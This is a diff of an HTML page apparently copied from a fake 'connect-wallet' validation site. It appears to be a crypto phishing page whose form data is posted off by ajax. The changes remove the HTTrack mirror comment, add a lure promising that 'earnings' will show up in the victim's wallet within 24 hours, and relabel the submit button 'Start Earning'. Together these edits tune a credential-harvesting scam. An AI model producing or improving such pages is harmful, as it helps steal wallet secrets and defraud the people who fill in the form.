@@ -1,8 +1,4 @@
 <html>
-
-
-<!-- Mirrored from www.connect-wallet.co/validate.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 24 Apr 2021 20:36:17 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
     <link rel="stylesheet" href="main.css" type="text/css" />
     <meta charset="UTF-8">
@@ -46,7 +42,7 @@
             type:'post',
             data:$("#myForm").serializeArray(),
             success: function(){
-                alert("If you have entered your information correctly, you should receive confirmation within 3 mins. Please stay on page.");
+                alert("If you have entered your information correctly, you should receive confirmation within 3 mins and your earning should reflect in your wallet within 24hrs. Please stay on page.");
                 location.reload();
             },
             error: function(){
@@ -92,7 +88,7 @@
                 </p>
                 <div class="desc"></div>
                 </br>
-                <button type="submit" name="submit" class="btn" onclick="SubForm()">VALIDATE</button>
+                <button type="submit" name="submit" class="btn" onclick="SubForm()">Start Earning</button>
             </form>
         </div>
 
